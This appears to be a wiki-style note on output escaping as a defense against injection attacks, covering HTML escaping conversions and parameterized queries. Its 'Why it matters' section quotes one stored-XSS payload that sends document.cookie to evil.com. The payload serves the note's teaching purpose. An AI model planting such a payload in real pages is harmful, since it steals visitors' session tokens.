# Output Escaping

## What it is
Like a translator who puts dangerous phrases in quotes so listeners know "this is just words, not a command," output escaping converts special characters into harmless representations before rendering them to users. Precisely: it is the process of encoding user-supplied data before it is written to an output context (HTML, SQL, shell, etc.) so that interpreters treat it as literal text rather than executable code. It is the primary technical defense against injection attacks.

## Why it matters
In 2014, a vulnerable web forum failed to escape user profile bios, allowing an attacker to inject `<script>document.location='https://evil.com/?c='+document.cookie</script>`. Every visitor who loaded that profile had their session token silently stolen — a stored XSS attack that compromised thousands of accounts before detection. Proper HTML escaping, converting `<` to `&lt;` and `>` to `&gt;`, would have rendered the payload inert.

## Key facts
- **Context matters critically**: HTML escaping, URL encoding, JavaScript escaping, and SQL parameterization are *different* techniques for different output contexts — using the wrong one provides no protection
- **HTML escaping core conversions**: `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`, `'` → `&#x27;`, `&` → `&amp;`
- **Escaping ≠ input validation**: Escaping handles output rendering; validation rejects malformed input at entry — both layers are required
- **Stored vs. Reflected XSS**: Escaping defends against both, but stored XSS is higher severity because the payload persists in the database and fires for every victim automatically
- **Parameterized queries** are the SQL equivalent of escaping — they separate code from data at the driver level, making SQL injection structurally impossible regardless of input content

## Related concepts
[[Cross-Site Scripting (XSS)]] [[SQL Injection]] [[Input Validation]] [[Content Security Policy]] [[Injection Attacks]]